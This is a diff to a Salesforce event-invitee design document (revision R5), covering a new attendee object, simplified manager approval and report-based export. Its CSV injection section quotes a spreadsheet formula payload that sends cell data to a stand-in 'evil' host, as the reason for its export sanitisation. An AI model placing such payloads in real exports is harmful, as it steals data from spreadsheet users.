@@ -72,17 +72,62 @@ R4 items are marked ★R4. Screens 2–5 are untouched: the Approval Process, th
 ladder, the `Lead__c` junction, the `Invitee_*__c` formulas and both reports are all
 exactly as R3 left them.
 
+**Revised 2026-08-12 (R5) — imported people get their own object; the workflow stops
+touching standard objects.** A requirements change that supersedes large parts of R3 and R4:
+
+> Everyone newly imported is created on a new object, **Event Attendee**. Not bound to
+> Account, and no Contacts are created. The point is that future Marketing Events all relate
+> to this new object.
+
+This is a bigger change than its two sentences suggest, because it removes the constraint
+that shaped the previous two revisions rather than working within it. R3 and R4 both spent
+their design budget on the same problem — *where do we put a person who is not a customer?* —
+and answered it twice with borrowed containers: a Lead in R3, a two-headed history object in
+R4. R5 answers it with a container of our own, and the borrowed ones become unnecessary
+rather than better.
+
+Four consequences, and only the first was asked for:
+
+1. **`Event_Invitee__c` becomes a single-headed junction.** `Contact__c` and `Lead__c`
+   collapse into one `Event_Attendee__c` lookup. The XOR validation rule, the `Account__c` and
+   `Account_Owner__c` snapshots and `Invitee_Type__c` all go with them.
+2. **`Event_History__c` is deleted, one revision after being built.** With an attendee object,
+   "was on a list for this event" and "was invited to this event" are the same row. R4 was not
+   wasted work — it is what made the requirement legible — but it was one step short, and
+   saying so is more useful than keeping the object to justify it.
+3. **The approver ladder loses two of its three rungs.** Account Owner needed an Account and
+   Lead Owner needed a Lead. What remains is the submitter's manager, which is what
+   requirement.md asked for before Account Owner was ever used as a stand-in for it.
+   **This is the largest functional loss in R5 — see Open Question 15.**
+4. **The import stops reading standard objects, not just writing them.** R4 could say it no
+   longer needed *edit* on Contact. R5 needs no permission on Contact, Lead or Account at all,
+   which is a materially stronger claim: the feature becomes safe to hand to an org that would
+   never let an import near its customer data.
+
+**What it costs is not small, and is tabled rather than buried** — see *The price, stated
+plainly* under *Data model*. In short: no link at all between an attendee and existing
+customer data, organisation reduced to free text with nothing behind it, de-duplication
+resting entirely on one composite key, and the attendee list no longer scoped per AM.
+
+R5 items are marked ★R5. Where an earlier revision's reasoning is now moot, it is struck
+through and kept rather than deleted — the reasoning was sound for the shape it was written
+against, and a reader deciding whether to revisit this design needs to see why the shape
+changed, not just that it did.
+
 ## Problem Statement
 
-Account Managers (AMs, mostly US/EU-based) collect external contact lists (CSV) from conferences and other systems. Today there is no structured way to: (1) reconcile those lists against existing Salesforce Contacts, (2) assemble an event invitee list from multiple AMs' accounts, (3) get per-contact sign-off from each Account Owner (the AM's manager/director), and (4) export the approved list. The PoC demonstrates this complete workflow inside the company's Salesforce Sandbox, on top of existing Account and Contact objects.
+Account Managers (AMs, mostly US/EU-based) collect external attendee lists (CSV) from conferences and other systems. Today there is no structured way to: (1) get those people into Salesforce at all, (2) assemble an event invitee list that several AMs contribute to, (3) get per-person sign-off from a manager, and (4) export the approved list. The PoC demonstrates this complete workflow inside the company's Salesforce Sandbox.
+
+★R5 **The original framing said "on top of existing Account and Contact objects", and that is no longer true — deliberately.** Step 1 was written as *reconcile the list against existing Contacts*, and three revisions have walked that back one step at a time: R4 stopped writing to Contact, R5 stopped reading it. Imported people live on `Event_Attendee__c`, an object this project owns. What that buys is a feature with no blast radius outside itself; what it costs is that the system can no longer tell you which of tonight's guests are existing customers. Both are stated under *Data model*.
 
 **Demo audience:** marketing/sales AM colleagues. The "whoa" moment is operational: batch selection, one-click submission, and a clean bulk-approval experience — minimal manual work end to end.
 
 ## What Makes This Cool
 
-- **Diff-preview import**: upload a .csv and instantly see how every row resolves before anything touches the database. ★R4 The preview survived the requirements change even though what it previews did not: it now shows who was matched, who could not be told apart, and who will be created as a Lead — and, because the import no longer writes to Contacts at all, the thing it mostly proves is what *will not* happen.
-- **Multi-AM collaboration on one Event**: every AM adds contacts from their own accounts; batches are independent, nobody blocks anybody.
-- **Approval that respects org structure**: each Account Owner sees only contacts under their accounts, with Select All → Approve in two taps, on desktop or the Salesforce Mobile App.
+- **Diff-preview import**: upload a .csv and see exactly what will happen to every row before anything touches the database. ★R5 The preview has now outlived two complete rewrites of what it previews — R2's create/update diff, R4's match cascade, R5's new/known/skipped split. That it survived all three is the sign it was the right idea: the valuable part was never the matching, it was *showing the user the consequence before committing to it*.
+- **An import with no blast radius**: ★R5 the feature reads and writes exactly one object, which it owns. The most interesting thing the result screen says is a negative — no contact, lead or account was created, changed or deleted — and it is a claim the tests assert rather than the copy merely promising.
+- **Multi-AM collaboration on one Event**: every AM adds their own batch from a shared attendee pool; batches are independent, nobody blocks anybody.
+- **Approval that respects org structure**: each manager reviews their own reports' submissions, with Select All → Approve in two taps, on desktop or the Salesforce Mobile App.
 
 ## Constraints
 
@@ -96,7 +141,7 @@ Account Managers (AMs, mostly US/EU-based) collect external contact lists (CSV) 
 
 1. ~~Matching key for import is **Email**; same email with different title/phone ⇒ update.~~ **Superseded by R4 (premise 11):** matching is a name → company → email cascade, and nothing on a Contact is updated ever.
 2. ~~**Company change is flagged for manual review**, not auto-moved.~~ **Superseded by R4:** the import no longer reads a Contact's Account for comparison, so there is no company change to detect. The manual-review download it justified survives, now carrying ambiguous matches instead.
-3. Approval is **grouped by Account Owner**: each Owner independently approves/rejects only contacts under their own accounts.
+3. ~~Approval is **grouped by Account Owner**: each Owner independently approves/rejects only contacts under their own accounts.~~ ★R5 **Superseded:** approval is grouped by *submitter*, and each AM's batch goes to that AM's manager. The grouping survives — batches are still independent and nobody blocks anybody — but the axis changed from "whose customer is this" to "who submitted this". That is a real change to a confirmed premise, not a detail; **Open Question 15**.
 4. iOS approval means the Salesforce Mobile App rendering our LWC — no native app.
 5. Export = CSV download of approved contacts — one event at a time from its record page, or every event at once from a dedicated app page, optionally narrowed to the date range the sign-offs happened in.
 6. Events are **shared**: any AM can add contacts from their own accounts to the same Event; each invitee records who added it; each AM submits their own batch; completion notifications go to the AM who added those contacts.
@@ -217,32 +262,44 @@ becomes a report over near-duplicates, and correcting a misspelt name fixes one 
 copies. Person-level costs a de-duplication key and gives the Event Attendee page a related
 list of every event they have ever been put forward for.
 
-★R3 **Two lookups, not one polymorphic field.** A custom lookup cannot reference two objects,
-so the junction carries both and a validation rule enforces exactly one:
+~~★R3 **Two lookups, not one polymorphic field.**~~ **Retired by R5.** A custom lookup cannot
+reference two objects, so R3's junction carried both and `Invitee_Is_Contact_Xor_Lead`
+enforced exactly one:
 
 ```
-ISBLANK(Contact__c) = ISBLANK(Lead__c)
-  → "An invitee must be either a Contact or a Lead — not both, and not neither."
-     (both blank ⇒ TRUE = TRUE ⇒ error;  both set ⇒ FALSE = FALSE ⇒ error;  exactly one ⇒ passes)
+ISBLANK(Contact__c) = ISBLANK(Lead__c)     ← deleted in R5
 ```
 
-★R3 **The five formula fields are the load-bearing piece of this revision, not cosmetics.**
-Every downstream consumer — the *All Invitees* table, the Approval Process's email template,
-and above all the Screen 5 **reports** — needs one column that reads correctly whether the
-invitee is a Contact or a Lead. A report cannot branch across two lookup paths by itself;
-a formula field on the junction can, and it costs nothing to maintain. Without these,
-"replace the export LWC with a report" would not have been possible at all.
+With one head there is no XOR left to state, only that the head is populated —
+`Invitee_Requires_Attendee`, `ISBLANK(Event_Attendee__c)`. The R3 reasoning was correct for a
+junction that had to point at two objects; R5 removed the second object rather than finding a
+better rule for it.
 
-★R3 **What is deliberately *not* stored:** no copy of the Lead's name, company or email on
-the invitee. `Lead__c` is a live lookup and the formulas read through it. This is inconsistent
-with the `Account__c` snapshot rationale above, and the inconsistency is intentional — the
-snapshot exists to stop an Account *reparent* from rewriting approval history, a risk a Lead
-does not have (a Lead is never reparented; it is converted, and conversion leaves the Lead row
-intact and readable).
+~~★R3 **The five formula fields are the load-bearing piece of this revision.**~~ ★R5 **Now
+four, and no longer load-bearing.** Their whole job was letting one report column read
+correctly whether an invitee was a Contact or a Lead — a report cannot branch across two
+lookup paths by itself, and without them "replace the export LWC with a report" would not have
+been possible. Reading through a single lookup needs no such trick. The four survivors are
+kept because they cost nothing and because repointing a dozen consumers at
+`Event_Attendee__r` would be churn for its own sake, **not** because anything depends on the
+indirection any more. `Invitee_Type__c` is deleted outright: with one kind of invitee it
+always reads the same word.
+
+~~★R3 **What is deliberately *not* stored:** no copy of the Lead's name, company or email.~~
+★R5 **Still true, and now the only rule.** Every `Invitee_*__c` field reads live through the
+attendee, and nothing is snapshotted anywhere on the invitee — the `Account__c` and
+`Account_Owner__c` snapshots are deleted along with the objects they pointed at. R3 had to
+justify an *inconsistency* here (Account snapshotted, Lead live) on the grounds that an
+Account can be reparented and a Lead cannot. R5 has no inconsistency to justify: correcting a
+misspelt name on an attendee fixes it on every invitee at once, which is what you want for
+fields nobody makes decisions on. The thing genuinely lost is that an attendee edited *after*
+approval silently rewrites what the approval history appears to show — acceptable while the
+attendee is import-owned data nobody hand-edits, and worth revisiting the day somebody starts
+editing them.
 
 **Design note — status lives on the invitee, not the event.** The event-level "Draft → Pending Approval → Approved → Exported" shown in the Screen-2 sketch is a simplification. With multiple AMs submitting independent batches, a single event-level state machine would deadlock (one AM's pending batch would block another's). The Event page instead shows roll-up counts (e.g. "23 invitees · 12 pending · 9 approved · 2 rejected"). `Status__c` on `Event_Invitee__c` is the real state machine and is system-managed (field-level security: read-only for AMs; mutated only by Apex).
 
-**Snapshot rationale:** `Account_Owner__c` is copied at submit time so an ownership change mid-approval doesn't silently reroute pending items.
+~~**Snapshot rationale:** `Account_Owner__c` is copied at submit time so an ownership change mid-approval doesn't silently reroute pending items.~~ ★R5 **The field is deleted; the principle it protected is not.** `Approver__c` is still resolved once at submit time and frozen, so an org-chart change mid-approval cannot reroute an item somebody is already looking at. Same guarantee, one field instead of two, because there is only one thing left to freeze.
 
 ### ★R5 Approval routing — one rung
 
@@ -394,6 +451,15 @@ The Lead work therefore did not just *coexist* with the standardisation pass —
 made the standard feature applicable at all, because "the Account Owner" was never expressible
 as a field on the invitee for a Lead.
 
+★R5 **That argument now reads oddly, and is worth keeping for it.** R3 introduced
+`Approver__c` because Leads made the routing rule too complicated to express any other way.
+R5 deleted the Leads, and the rule collapsed to "the submitter's manager" — which
+`$User.Manager` could arguably express without a stored field at all. `Approver__c` stays
+anyway, for a reason that has nothing to do with how simple the rule is: an approval process
+routes to a **stored** lookup, and freezing the approver at submit time is what stops an
+org-chart change mid-approval from silently rerouting an item somebody is already looking at.
+The field was justified twice over; only the second justification survives.
+
 **Entry criteria** none (submission is always explicit, from Screen 3).
 **Record editability while pending:** locked — an improvement; today an AM can edit a submitted row.
 **Rejection is final** (single step, no reassignment): a rejected invitee returns to the pool
@@ -421,6 +487,13 @@ setting, and that **mass approve/reject in the Lightning Approval Requests list 
 acceptably for ~40 rows. If mass approval turns out to be one-at-a-time in this org's release,
 Option 2's email replies become the fast path and the recommendation flips.
 
+★R5 **The volume problem got worse, not better, and Option 1 matters more because of it.**
+R3's 40 emails were spread across however many Account Owners a batch touched; R5 routes an
+AM's entire batch to a single person, so all 40 land on one manager — and if several AMs
+report to the same manager, their batches stack on the same inbox. Nothing about Option 1's
+mechanism changes, but skipping its post-deploy step is now a worse outcome than it was, and
+the aggregate notification it preserves is doing more work than before.
+
 #### ★R3 Completion notification — why `EventNotificationService` survives
 
 "When this AM's last Pending row for this event is decided, tell them X approved / Y rejected"
@@ -446,8 +519,10 @@ reports**. (`c/csvDownload` stays — Screen 1's manual-review list still uses i
   `Event_Invitee__c`, "with" not "with or without"). Declarative.
 - **Report: "Approved Invitees — by Event"** — filter `Status = Approved`, group by Event;
   columns `Invitee_Name__c`, `Invitee_Title__c`, `Invitee_Org__c`, `Invitee_Email__c`,
-  `Invitee_Type__c`, Approver, `Decided_At__c`, Added By. Replaces both the per-event button
+  Approver, `Decided_At__c`, Added By. Replaces both the per-event button
   and the cross-event download: to get one event, filter it; to get all, don't.
+  ★R5 `Invitee_Type__c` is dropped from both reports and the report type — a column that
+  always reads the same word is noise, and it existed only to tell Contact rows from Lead rows.
 - **Report: "My Approved Invitees"** — the same, filtered `Added By = $User.Id`, replacing
   the *Only invitees I added* toggle.
 
@@ -492,11 +567,11 @@ What each removed feature becomes:
 
 **Getting the file onto the user's machine intact** is its own small problem, handled once in the shared `c/csvDownload` module: rows are joined with CRLF (RFC 4180) and the Blob is prefixed with a UTF-8 BOM, without which desktop Excel decodes the file as the local ANSI codepage and mangles every non-ASCII name; the object URL is revoked on a later tick because revoking in the same tick as `click()` cancels the download in Safari and older Chrome. The import wizard's company-change manual-review list downloads through the same module.
 
-**CSV formula injection.** Every exported value is data a user can set — a Contact Title, an Account name, a Lead's Company, an event name, or a cell from the uploaded .csv — so a value opening with `=`, `+`, `-`, `@` (or a tab/CR that Excel skips before them) would be *executed* when the file is opened: `=HYPERLINK("http://evil/?d="&A1,"Invoice")` exfiltrates the neighbouring row on a single click, and DDE payloads go further. `c/csvDownload` prefixes such values with an apostrophe and always quotes the result. Accepted trade-off: the apostrophe is visible in some spreadsheet/import combinations, which is tolerable because every exported column is text — no legitimate value is a negative number the guard would damage. ★R3 The Apex mirror `EventExportController.csvCell` is deleted with its class, so this guard now covers **only** Screen 1's manual-review download; the approved-invitee export inherits whatever the standard report exporter does, which is no sanitisation at all. The "two parallel implementations must stay in step" hazard is gone — replaced by a gap.
+**CSV formula injection.** Every exported value is data a user can set — ★R5 and after R5 that is no longer a mixture of curated org data and uploaded cells: *every* name, title, organisation and email on an invitee came out of an uploaded .csv, because that is the only way an attendee is created. The input surface is now uniformly untrusted, which makes the gap below worth re-reading rather than assuming it is unchanged. A value opening with `=`, `+`, `-`, `@` (or a tab/CR that Excel skips before them) would be *executed* when the file is opened: `=HYPERLINK("http://evil/?d="&A1,"Invoice")` exfiltrates the neighbouring row on a single click, and DDE payloads go further. `c/csvDownload` prefixes such values with an apostrophe and always quotes the result. Accepted trade-off: the apostrophe is visible in some spreadsheet/import combinations, which is tolerable because every exported column is text — no legitimate value is a negative number the guard would damage. ★R3 The Apex mirror `EventExportController.csvCell` is deleted with its class, so this guard now covers **only** Screen 1's manual-review download; the approved-invitee export inherits whatever the standard report exporter does, which is no sanitisation at all. The "two parallel implementations must stay in step" hazard is gone — replaced by a gap.
 
 ### Permissions (PoC-minimal)
 
-Two Permission Sets: `Event_AM` (create events, import contacts, add/submit invitees, run the approved-invitee reports — grants the *Import Contacts* tab) and `Event_Approver` (read events, decide invitees). `Status__c` is read-only via FLS for both; the mutating Apex runs in system mode (without `WITH USER_MODE` on those DML statements) so status transitions bypass FLS by design. ★R3 The Approval Process's field updates likewise run in system context, so the FLS-read-only status survives the move to standard approvals unchanged.
+Two Permission Sets: `Event_AM` (create events, import attendees, add/submit invitees, run the approved-invitee reports — grants the *Import Attendees* tab, whose API name stays `Import_Contacts` because renaming a tab churns the app and both permission sets for no functional gain) and `Event_Approver` (read events, decide invitees). `Status__c` is read-only via FLS for both; the mutating Apex runs in system mode (without `WITH USER_MODE` on those DML statements) so status transitions bypass FLS by design. ★R3 The Approval Process's field updates likewise run in system context, so the FLS-read-only status survives the move to standard approvals unchanged.
 
 ★R3 **Changes to both sets:**
 
@@ -685,6 +760,40 @@ against no org in this repo, and the Approval Process, Flow, report type and rep
 never been round-tripped through a real deployment — first deploy should expect to fix
 metadata details, not logic.
 
+### ★R5 What still needs an org
+
+Everything verifiable from the repo has been verified: 167 LWC tests, ESLint, Prettier and
+10/10 mutants behaving as expected. What that does *not* cover is larger in R5 than in earlier
+revisions, because more of the change is metadata:
+
+1. **The whole deploy.** No Apex in this repo has been compiled against an org, and R5 adds an
+   object, repoints four formula fields, and rewires a report type, two reports, an approval
+   process, two permission sets, a layout, an app and a record page. First deploy should expect
+   to fix metadata details, not logic.
+2. **The migration is the risky step, and it is untested.** `scripts/r5-pre-deploy.apex` is
+   anonymous Apex that cannot be unit-tested — it references `Contact__c` and `Lead__c`, which
+   the R5 source no longer contains. It must be dry-run against a throwaway sandbox holding
+   realistic invitee data before it goes anywhere that matters, because the failure mode is
+   silent and permanent: an invitee that misses the back-fill points at nobody once
+   `destructiveChangesPre` has run.
+3. **The window between the additive deploy and the migration.** `Invitee_Requires_Attendee`
+   is live while existing invitees still have a blank attendee, so any update to one — including
+   an approval decision — fails until the back-fill completes. This is reasoned about, not
+   observed. Confirm the window is as short as expected and that nothing else writes to
+   `Event_Invitee__c` during it.
+4. **Whether cross-object formulas resolve for an approver.** `Invitee_Name__c` and
+   `Invitee_Org__c` traverse `Event_Attendee__r`. The design grants `Event_Approver` read on
+   the object and sets the OWD to Public Read/Write on the assumption that this is sufficient;
+   the failure mode if it is not is a blank name on the approval screen — the exact symptom R3
+   hit with a Private Lead OWD, on a different object. **Check it on a real approver user, not
+   as an admin**, because an admin will see the data either way.
+5. **PMD.** The baseline was pruned of the deleted classes but nothing has scanned the ones
+   that replaced them. Re-record on the first machine with PMD installed; see QUALITY.md.
+
+Carried over from R3 and still unverified: mass approve/reject at ~40 rows in the Lightning
+Approval Requests list, and the exact label of the user-level approval-email setting. Item 1's
+volume argument (see *Screen 4*) makes the first of those matter more than it did.
+
 ## ★R3 Rejected alternatives for the no-Account invitee
 
 Premise 7 (Account = transacting customer, not negotiable) eliminated three otherwise
@@ -797,7 +906,7 @@ Demo script runs end-to-end in the Sandbox without manual data fixes:
 ## Dependencies
 
 - Sandbox access with permission to deploy metadata (SFDX / Salesforce CLI, API access enabled).
-- Two test users (AM role, Owner role) in the Sandbox for the multi-user demo.
+- ★R5 Three test users for the multi-user demo: two AMs and one manager, with the manager set on both AMs' user records. (R3 needed two AMs and two Account Owners; with routing down to one rung, the second approver has nothing to approve.)
 - One real anonymized .csv sample from the source system (nice-to-have; seed script otherwise).
 
 ## Next Steps
@@ -832,3 +941,5 @@ second is the expensive order.
 - You chose Approach B over the recommended hybrid: you'd rather own the full experience than inherit Campaign's constraints. That's a taste call, and a defensible one in the AI-build era.
 - Twice you corrected course on audience realism before anything else ("應該上傳 Excel", "UI都用英文呈現, AM同事大多是美國或歐洲人") — you design from the actual user's desk, not from the platform's defaults.
 - "其他的AM也可以將自己的Contacts加到Event" — you caught the multi-user collaboration case that single-demo thinking usually misses.
+- ★R5 You spent R3 and R4 finding increasingly careful ways to work *around* "an Account means a transacting customer" — a Lead here, a two-headed junction there — and then, in two sentences, removed the need to work around it at all. That is a different kind of move from the previous revisions: they were local fixes to a container that did not fit, and this one changed the container. The tell that it was the right call is how much machinery simply stopped being necessary rather than getting better.
+- ★R5 You also asked for it as a *refactor*, not a feature. That framing is what made it possible to delete `Event_History__c` one revision after building it. A feature request would have had to justify keeping the old object working alongside the new one; a refactor is allowed to say the previous answer was one step short.
